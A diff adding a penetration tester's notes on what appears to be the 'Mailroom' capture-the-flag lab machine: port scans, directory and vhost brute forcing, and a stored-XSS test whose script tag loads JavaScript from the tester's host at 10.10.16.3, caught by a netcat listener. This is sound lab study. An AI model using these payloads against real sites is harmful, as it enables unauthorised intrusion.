@@ -1,0 +1,306 @@
+2023-04-15 21:10:55 CDT -- START TIME
+
+### Mailroom ###
+----------------------------------------
+|================================================================
+- Name: 
+- IP Address: 10.129.250.179
+- OS: 
+- Notes: 
+
+//CREDS:
+
+//Flags:
+#User:
+#System:
+
+|================================================================
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+// nmap --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+// SCAN
+ip=10.129.250.179
+
+2023-04-15 21:14:31 CDT -- 
+ports=$(nmap -e tun0 -Pn -p- --min-rate=1000 -T4 $ip | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
+
+echo $ports
+//22,80,626,4272,6416,13421,20702,29535,31203,44766,50930,53347,54828
+
+2023-04-15 21:16:00 CDT -- 
+nmap -e tun0 -Pn -A -p$ports $ip -oN tcp.nmap
+
+PORT      STATE  SERVICE          VERSION
+22/tcp    open   ssh              OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 94bb2ffcaeb9b182afd789811aa76ce5 (RSA)
+|   256 821beb758b9630cf946e7957d9ddeca7 (ECDSA)
+|_  256 19fb45feb9e4275de5bbf35497dd68cf (ED25519)
+80/tcp    open   http             Apache httpd 2.4.54 ((Debian))
+|_http-server-header: Apache/2.4.54 (Debian)
+|_http-title: The Mail Room
+626/tcp   closed apple-imap-admin
+4272/tcp  closed vrml-multi-use
+6416/tcp  closed unknown
+13421/tcp closed unknown
+20702/tcp closed unknown
+29535/tcp closed unknown
+31203/tcp closed unknown
+44766/tcp closed unknown
+50930/tcp closed unknown
+53347/tcp closed unknown
+54828/tcp closed unknown
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+2023-04-15 21:17:22 CDT -- 
+nmap -e tun0 -Pn -sV --script=vuln -p$ports $ip -oN vuln.nmap
+
+80/tcp    open   http             Apache httpd 2.4.54 ((Debian))
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+| http-csrf: 
+| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.129.250.179
+|   Found the following possible CSRF vulnerabilities: 
+|     
+|     Path: http://10.129.250.179:80/contact.php
+|     Form id: email
+|_    Form action: contact.php
+|_http-server-header: Apache/2.4.54 (Debian)
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
+
+# UDP scan
+sudo nmap -e tun0 -Pn -sU --top-ports 100 $ip -oN udp.nmap
+
+PORT   STATE         SERVICE
+68/udp open|filtered dhcpc
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+-- feroxbuster --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+# feroxbuster example
+2023-04-15 21:30:12 CDT -- 
+feroxbuster -k -u http://10.129.250.179 -o feroxbuster.out
+
+200  http://10.129.250.179/
+200  http://10.129.250.179/contact.php
+200  http://10.129.250.179/about.php
+200  http://10.129.250.179/services.php
+200  http://10.129.250.179/index.php
+200  http://10.129.250.179/javascript/jquery/jquery
+
+301  http://10.129.250.179/js => http://10.129.250.179/js/
+301  http://10.129.250.179/css => http://10.129.250.179/css/
+301  http://10.129.250.179/assets => http://10.129.250.179/assets/
+301  http://10.129.250.179/javascript => http://10.129.250.179/javascript/
+301  http://10.129.250.179/font => http://10.129.250.179/font/
+301  http://10.129.250.179/javascript/jquery => http://10.129.250.179/javascript/jquery/
+301  http://10.129.250.179/inquiries => http://10.129.250.179/inquiries/
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// gobuster --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+// directory brute force
+2023-04-15 21:54:17 CDT -- 
+gobuster dir -u http://10.129.250.179 -w /usr/share/dirb/wordlists/common.txt -x php,txt,html,htm -o gobuster-80.txt
+
+
+// vhost brute force
+gobuster vhost -u <> -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// nikto -- 
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+// scan website
+2023-04-15 21:59:29 CDT -- 
+nikto -h http://10.129.250.179 -o nikto_scan.txt
+
++ Server: Apache/2.4.54 (Debian)
++ /: Retrieved x-powered-by header: PHP/7.4.33.
++ /README.md: Readme Found.
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// BURP
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+http://10.129.250.179
+//Bottom of page
+Made with ♥ for mailroom.htb
+
+-- add /etc/hosts file entries --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+2023-04-15 22:35:24 CDT -- 
+# add /etc/hosts entry nix
+sudo sh -c "echo '10.129.250.179 mailroom.htb' >> /etc/hosts"
+cat /etc/hosts
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+http://10.129.250.179/contact.php
+//Please fill out the form below to send us an inquiry. Our advanced new AI will automatically read your inquiry and determine its urgency to supply the best response times for you.
+
+http://10.129.250.179/about.php
+// Potential Users
+Tristan Pitt - Software Engineer
+Matthew Conley - System Administrator
+Chris McLovin' - Management
+Vivien Perkins - Delivery Coordinator
+
+http://10.129.250.179/services.php
+//We offer a wide variety of services. Feel free to browse and contact us about any inquiry you have. Whether it's a question, or you want to make an order with us.
+//Services:
+// Shop for you
+// Box for you
+// Bricks
+
+http://10.129.250.179/index.php
+http://10.129.250.179/javascript/jquery/jquery
+//A jQuery JavaScript Library v3.5.1 script
+wget http://10.129.250.179/javascript/jquery/jquery
+
+//All 403 Errors
+http://10.129.250.179/js/
+http://10.129.250.179/css/
+http://10.129.250.179/assets/
+http://10.129.250.179/javascript/
+http://10.129.250.179/font/
+http://10.129.250.179/javascript/jquery/
+http://10.129.250.179/inquiries/
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// gobuster vHOst --
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+2023-04-15 22:38:05 CDT -- 
+// vhost brute force
+gobuster vhost -u mailroom.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain -o vhost.out
+
+//Found: git.mailroom.htb Status: 200 [Size: 13201]
+// Add to /etc/hosts
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// contact.php
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+//Email Address: test@test.com
+//Inquiry Title: WAT
+//Inquiry Message: Does this work?
+
+//Request
+email=Test%40test.com&title=WAT&message=Does+this+work%3F
+
+//Once submitted, the form generates a "Click Here" link
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// Testing XXS
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+//Email Address: test@test.com
+//Inquiry Title: test
+//Inquiry Message: <script>alert("TEST")</script>
+email=test%40test.com&title=test&message=<script>alert("TEST")</script>
+
+//WORKS!!
+
+//Start Listener for script reachback
+//Use http
+sudo nc -nvlp 80
+
+//Email Address: test@test.com
+//Inquiry Title: test
+//Inquiry Message: <script>alert("TEST")</script>
+
+2023-04-15 23:04:58 CDT -- 
+<script type="text/javascript" src="http://10.10.16.3/test.js"></script>
+
+connect to [10.10.16.3] from (UNKNOWN) [10.129.250.179] 56896
+GET /test.js HTTP/1.1
+Host: 10.10.16.3
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://127.0.0.1/
+Connection: keep-alive
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+//BURP
+http://git.mailroom.htb 
+//Gitea website
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+//Found public repo
+http://git.mailroom.htb/matthew/staffroom
+
+//REPOS
+2023-04-15 23:16:34 CDT -- 
+git clone http://git.mailroom.htb/matthew/staffroom.git
+
+//Users
+Administrator
+Mathew
+Tristen
+
+cd staffroom
+git log -p
+
+-    // Update the user record in the database with the 2FA token
+-    $collection->updateOne(
+-      ['_id' => $user['_id']],
+-      ['$set' => ['2fa_token' => $token]]
+-    );
+-
+-    // Send an email to the user with the 2FA token
+-    $to = $user['email'];
+-    $subject = '2FA Token';
+-    $message = 'Click on this link to authenticate: http://staff-review-panel.mailroom.htb/auth.php?token=' . $token;
+-    mail($to, $subject, $message);
+
++    // Update the user record in the database with the 2FA token if not already sent in the last minute^M
++    $user = $collection->findOne(['_id' => $user['_id']]);^M
++    if(($user['2fa_token'] && ($now - $user['token_creation']) > 60) || !$user['2fa_token']) {^M
++        $collection->updateOne(^M
++          ['_id' => $user['_id']],^M
++          ['$set' => ['2fa_token' => $token, 'token_creation' => $now]]^M
++        );^M
++^M
++        // Send an email to the user with the 2FA token^M
++        $to = $user['email'];^M
++        $subject = '2FA Token';^M
++        $message = 'Click on this link to authenticate: http://staff-review-panel.mailroom.htb/auth.php?token=' . $token;^M
++        mail($to, $subject, $message);^M
++    }
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+
+
+
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+
